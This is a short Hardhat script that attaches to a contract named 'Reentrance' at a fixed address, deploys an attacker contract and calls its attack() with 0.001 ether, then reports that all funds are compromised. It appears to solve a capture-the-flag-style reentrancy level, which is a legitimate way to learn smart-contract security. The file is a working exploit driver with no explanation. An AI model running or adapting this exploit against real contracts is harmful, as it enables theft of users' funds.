const { ethers } = require("hardhat");

const REENTRANCE_CONTRACT_NAME = "Reentrance";
const REENTRANCE_CONTRACT_ADDRESS = "0x2c975ffA68D14b81Df2CFAA3D9A74066573B6BDA";
const ATTACKER_REENTRANCE_CONTRACT_NAME = "Reentrance_Attacker";

async function main() {
    const reentranceFactory = await ethers.getContractFactory(REENTRANCE_CONTRACT_NAME);
    const reentranceContract = reentranceFactory.attach(REENTRANCE_CONTRACT_ADDRESS);

    console.log("Reentrance Contract attacked to Factory");

    const attackerReentranceFactory = await ethers.getContractFactory(ATTACKER_REENTRANCE_CONTRACT_NAME);

    const attackerReentranceContract = await attackerReentranceFactory.deploy(await reentranceContract.getAddress());
    await attackerReentranceContract.waitForDeployment();

    const ATTACKER_REENTRANCE_CONTRACT_ADDRESS = await attackerReentranceContract.getAddress();
    console.log("Attacker Reentrance Contract Deployed At: ", ATTACKER_REENTRANCE_CONTRACT_ADDRESS);

    const amountToSend = ethers.parseEther("0.001");

    const tx = await attackerReentranceContract.attack({ value: amountToSend });
    await tx.wait();

    console.log("Re entrancy success, All Funds compromised!");
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})